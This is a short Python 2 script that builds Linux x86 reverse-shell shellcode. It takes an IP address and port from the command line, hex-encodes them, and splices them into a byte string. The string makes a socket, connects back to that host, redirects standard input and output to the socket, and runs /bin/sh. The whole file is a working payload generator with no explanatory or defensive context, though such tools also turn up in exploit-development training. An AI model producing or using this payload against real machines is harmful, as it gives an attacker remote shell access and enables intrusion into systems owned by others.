import sys
import struct

if (len(sys.argv) < 3):
	print "IP and Port required"
else:
	IP_ADDR	= sys.argv[1].split(".")
	PORT	= sys.argv[2]
	ipaddr_hex = "\\x"+struct.pack('<L',int(IP_ADDR[0])).encode('hex')[:2]+"\\x"+struct.pack('<L',int(IP_ADDR[1])).encode('hex')[:2]+"\\x"+struct.pack('<L',int(IP_ADDR[2])).encode('hex')[:2]+"\\x"+struct.pack('<L',int(IP_ADDR[3])).encode('hex')[:2]
	port_hex = "\\x"+struct.pack('<L',int(PORT)).encode('hex')[2:4]+"\\x"+struct.pack('<L',int(PORT)).encode('hex')[:2]
	print "\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xd2\\x52\\x53\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x68"+ipaddr_hex+"\\x66\\x68"+port_hex+"\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x50\\x89\\xe1\\xb0\\x66\\xb3\\x03\\xcd\\x80\\x31\\xc9\\xb0\\x3f\\xcd\\x80\\x41\\xb0\\x3f\\xcd\\x80\\x41\\xb0\\x3f\\xcd\\x80\\xb0\\x0b\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x89\\xd1\\xcd\\x80"
